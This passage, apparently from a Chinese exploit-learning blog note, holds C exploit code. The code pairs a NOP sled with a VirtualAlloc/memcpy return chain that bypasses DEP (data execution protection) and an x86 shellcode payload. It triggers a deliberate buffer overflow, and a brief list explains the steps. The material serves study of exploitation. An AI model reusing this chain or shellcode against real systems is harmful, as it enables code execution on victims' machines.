+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x85\x8B\x1D\x5D</span><span class=s>&#34;</span> <span class=c1>// push esp pop ebp ret 4
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xE1\x9A\x80\x7C</span><span class=s>&#34;</span> <span class=c1>// Address of VirtualAlloc
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x70\x6F\xC1\x77</span><span class=s>&#34;</span> <span class=c1>// VirtualAlloc ret address
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x00\x00\x03\x00</span><span class=s>&#34;</span> <span class=c1>// Param: lpAddress
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xFF\x00\x00\x00</span><span class=s>&#34;</span> <span class=c1>// Param: dwSize
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x00\x10\x00\x00</span><span class=s>&#34;</span> <span class=c1>// Param: flAllocationType
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x40\x00\x00\x00</span><span class=s>&#34;</span> <span class=c1>// Param: flProtect
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x00\x00\x03\x00</span><span class=s>&#34;</span> <span class=c1>// memcpy ret address
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x00\x00\x03\x00</span><span class=s>&#34;</span> <span class=c1>// Param: destin
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x94\xFE\x13\x00</span><span class=s>&#34;</span> <span class=c1>// Param: source
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xFF\x00\x00\x00</span><span class=s>&#34;</span> <span class=c1>// Param: n
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C</span><span class=s>&#34;</span> <span class=c1>// payload
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>test</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>tt</span><span class=p>[</span><span class=mi>176</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=n>memcpy</span><span class=p>(</span><span class=n>tt</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>,</span> <span class=mi>450</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>HINSTANCE</span> <span class=n>hInst</span> <span class=o>=</span> <span class=n>LoadLibrary</span><span class=p>(</span><span class=s>&#34;shell32.dll&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>temp</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=n>test</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=技术细节>技术细节</h3><ul><li>首先使用VirtualAlloc申请一段空间用于执行shellcode</li><li>随后使用memcpy将shellcode复制过去</li><li>最后在memcpy返回时直接返回到shellcode payload的起始地址</li></ul></section><footer class=article-footer><section class=article-tags><a href=/zh-cn/tags/windows/>Windows</a>
+<a href=/zh-cn/tags/%E6%95%B0%E6%8D%AE%E6%89%A7%E8%A1%8C%E4%BF%9D%E6%8A%A4/>数据执行保护</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-016-%E5%88%A9%E7%94%A8%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98%E5%92%8C.net%E6%94%BB%E5%87%BBdep/><div class=article-details><h2 class=article-title>漏洞利用学习笔记-016-利用可执行内存和.NET攻击DEP</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-014-dep%E7%9A%84%E4%BB%8B%E7%BB%8D/><div class=article-details><h2 class=article-title>漏洞利用学习笔记-014-DEP的介绍</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-021-%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/><div class=article-details><h2 class=article-title>漏洞利用学习笔记-021-保护下的堆</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-020-sehop%E7%AE%80%E4%BB%8B/><div class=article-details><h2 class=article-title>漏洞利用学习笔记-020-SEHOP简介</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/><div class=article-details><h2 class=article-title>漏洞利用学习笔记-019-利用HeapSpray攻击ASLR</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=Moeomu/blog data-repo-id=R_kgDOHHJl4A data-category=Announcements data-category-id=DIC_kwDOHHJl4M4CR7uM data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en crossorigin=anonymous async></script>
+<script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2023 Misaka的秘密花园</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
